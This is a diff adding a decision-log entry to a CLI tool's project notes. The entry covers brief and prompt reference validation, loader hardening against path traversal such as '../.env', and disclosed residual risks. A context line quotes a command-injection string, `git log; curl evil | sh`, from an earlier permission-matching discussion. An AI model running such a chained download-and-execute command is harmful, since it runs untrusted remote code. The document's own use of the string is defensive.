@@ -16363,3 +16363,96 @@ veto its wildcard match applies — so exact `'git log; curl evil | sh'` was "co
   exercised only by this piece's tests; the base-grant integrity check is the path real dispatch hits.
 
 Full piece breakdown: `process/plans/PLAN-M13.md` P4.
+
+## Q197 — M13 P1: brief/prompt reference resolution — the validators are real, the content is not
+yet authored, so `forge workflow validate --all`/`forge agent validate --all` now report 53/62 findings
+on every fresh `forge init` (disclosed, temporary, itemized in tests)
+
+**Context:** `PLAN-M13.md` P1 replaced `workflow.ts`'s `briefExists: () => true` stub with a real
+check and added the equivalent `unknown-prompt` check for `prompt.system`/`prompt.briefs.*` to
+`agentValidateAll`. Both check the project's own materialized `.forge/briefs/` / `.forge/prompts/`
+through one shared definition of "a real, resolvable reference" (`@forge/agents/prompt`'s
+`listResolvableContentReferences`, also what the new loader `resolveContentReference` accepts): exactly
+`briefs/<name>.md` or `prompts/<name>.md`, a regular `.md` file whose text (excluding the
+`forge:generated` header) is non-empty. `BRIEF_INDEX`/`PROMPT_INDEX` (`@forge/templates`) exist and are
+wired into `forge init` (`readBriefFiles`/`readPromptFiles` -> `writeGeneratedDir`), but are still
+empty: no brief/prompt content is authored anywhere (`PLAN-M13.md` P2/P3, out of this piece's scope).
+
+**The expected regression, handled per the Q192/Q194 precedent.** Against the real, complete
+`modules/` roster a fresh `forge init` now yields 53 `unknown-brief` issues (every workflow step's
+`brief:`) and 62 `unknown-prompt` findings (34 agents' `prompt.system` + 28 `prompt.briefs.*`), where
+both commands were clean before. Not hidden, not fixed by authoring 124 files: every "zero issues"
+assertion was replaced with the real, complete, itemized list by agent/workflow/step id
+(`packages/cli/test/e2e/init.test.ts` E1 init, `packages/cli/test/commands/agent.test.ts`,
+`packages/cli/test/bin.test.ts` for the real subprocess exit-1 + stderr; the agent list is one shared
+constant, `packages/cli/test/fixtures/m13-p1-expected-agent-findings.ts`), and `docs/getting-started.md`
+/ `docs/authoring-guide.md` now say so. Tests whose intent is a genuine happy path
+(`workflow.test.ts` "passes cleanly", `agent.test.ts` fixture roster) write the real backing file
+instead of tolerating the finding. `P2`/`P3` closing this shrinks those lists to `[]` the way Q194 did
+for Q192.
+
+**Judgement calls and disclosed limits (from hostile review rounds, recorded rather than silently dropped):**
+
+1. **"Override layering" (`PLAN-M13.md` P1 Checks).** The only override mechanism that exists for
+   regenerable content today is `03` §3.3's: edit the generated file in place, hash drift is detected,
+   `keep-mine`/`take-theirs`/`merge` on re-init. Briefs/prompts go through the same `writeGeneratedDir`
+   and the loader reads the project's copy (test: a local edit is what resolves). `15` §15.2's
+   `overrides/prompts/<agent>.<brief>.md` overlay shape belongs to `forge compile`, whose
+   source-gathering is an already-disclosed unbuilt gap (`commands/compile.ts`); it is not consulted by
+   the loader or the validators, and would be flagged `unknown-prompt` if referenced.
+2. **Gate-embedded `brief:` references are not validated** (10 `critique-*` briefs in
+   `packages/templates/templates/checks/*.gate.yaml`). No command validates a gate document's
+   references at all — `briefExists` was never called for gates, before or after; `forge workflow
+   validate` only sees workflows. Pre-existing gap, not created or widened here; `specs/22` M13's
+   acceptance line ("every workflow/gate `brief:`") is therefore only half-covered until a gate
+   validator exists. Also open: four briefs appear only in `modules/fm-service`/`modules/fm-mobile`
+   workflows (`draft-contract`, `write-contract-tests`, `prepare-release-build`,
+   `prepare-store-submission`), which `forge init` does not materialize as workflows and no index
+   ships content for — module-shipped prompt/brief delivery (`19` module layout) is unresolved.
+3. **`isTemplateReference` bypass.** A `brief:` containing `{{` passes `briefExists` unverified, the
+   identical stance the four sibling oracle methods take (resolved only at plan compilation). No shipped
+   workflow uses it; a P5 dispatch that receives an unresolved template would still fail loudly in the
+   loader (`CFG-053` for a bare `{{x}}`, `RUN-079` for `briefs/{{x}}.md`, which matches the shape but names
+   no file).
+4. **Loader hardening after review.** Accepts only `briefs|prompts/<name>.md` (`CFG-053` otherwise,
+   before any read — earlier draft resolved anything under `.forge/`, e.g. `../.env` or
+   `config.local.yaml`), strips the `forge:generated` header (earlier draft returned it as prompt text),
+   and shares its predicate with both validators. A symlink inside `.forge/briefs/` pointing at another
+   file *inside* the project root is still followed (`ProjectPaths` contains to the root, not to the
+   directory) — adversarial-only, requires a hostile writer inside `.forge/`; recorded as residual risk.
+5. **`agentNew` / `workflowNew` scaffolds** (library functions; `bin.ts` wires only `validate --all`, so
+   neither is reachable from the CLI today) now name `prompts/<id>.system.md` / `briefs/<id>.md` and
+   write those files first, only if absent, because the agent scaffold otherwise failed the new
+   validation the moment it was created. Their placeholder text ("Describe ... here.") is unchanged
+   scaffold text and counts as non-empty content. The workflow scaffold's own `agent: engineer`
+   references no shipped agent and so still reports `unknown-agent` — pre-existing, not touched.
+6. **Validator findings carry no remedy hint** (they are validation findings, not `ForgeError`s); the
+   message names the exact reference so the file to create is unambiguous. `content.ts`'s
+   basename-collision guard still throws a bare `Error` (pre-existing); the new
+   `packages/agents/test/prompt/content-index.test.ts` enforces key = basename, unique basenames and
+   index-vs-disk agreement so an open index cannot silently produce an unresolvable file.
+7. **Two new error codes**, `CFG-053` (not a `briefs|prompts/<name>.md` reference) and `RUN-079` (no
+   such file), because `CFG-003` ("escapes the project root") and `RUN-034` (permissions/disk-space
+   remedy) would each misdirect the fix. A directory named like a brief still surfaces `RUN-034`.
+8. **Spec-layout additions.** `.forge/briefs/` and `.forge/prompts/` are new top-level regenerable
+   directories that `03` §3.3's layout tree and `18` §18.2's resolved-set list do not name (as with
+   `frameworks/`/`skills/`/`templates/` before them); the `03` §3.3 header text on every generated file
+   says "use overrides/", and no consumer of a `.forge/overrides/prompts/...` file exists yet (item 1),
+   so that hint is currently a dead end for briefs/prompts specifically. Recorded, spec not amended.
+9. **Loader has no production caller.** `PLAN-M13.md` P1's "a brief's text, not its path, reaches the
+   compiler" is proven at the loader's own contract (real text, header stripped, hostile refs refused);
+   wiring it into `buildSessionRequest`/`compilePrompt` is P5. The M6 exit-test line
+   `pnpm forge agent validate --all && pnpm forge workflow validate --all` now exits 1 on a fresh init
+   until P2/P3 land. On case-insensitive filesystems a reference with different case (`briefs/Foo.md`)
+   is reported unknown though the OS would open `foo.md`; a present-but-empty/unreadable file is also
+   reported as "unknown" without saying why. Both residual, minor.
+10. **Front matter in a brief** is returned as-is (only the `forge:generated` header line is removed);
+    whether P5's block [4] should strip a brief's own YAML front matter is P2's/P5's decision. Blank or
+    header-only files are refused by the loader (`RUN-079`) exactly as the validators exclude them; the
+    brief/prompt roots are fixed `.forge/briefs`/`.forge/prompts` rather than context fields.
+11. **Plan divergence:** `PLAN-M13.md` P1 says P1 and P2's first batch "merge together"; per the
+   coordinator's instruction P1 lands alone with the disclosed, itemized state above.
+
+Files: `packages/templates/src/index.ts`, `packages/cli/src/{init/content.ts,init/write-tree.ts,
+commands/workflow.ts,commands/agent.ts}`, `packages/agents/src/prompt/{resolve-reference.ts,index.ts}`,
+`packages/core/src/errors/codes.ts` (`CFG-053`, `RUN-079`) + `packages/core/test/errors.test.ts` (sample detail key), tests, `test/workspace-floor.test.ts` (`IGNORED_PATHS` entry for the shared fixture), `docs/getting-started.md`, `docs/authoring-guide.md`.
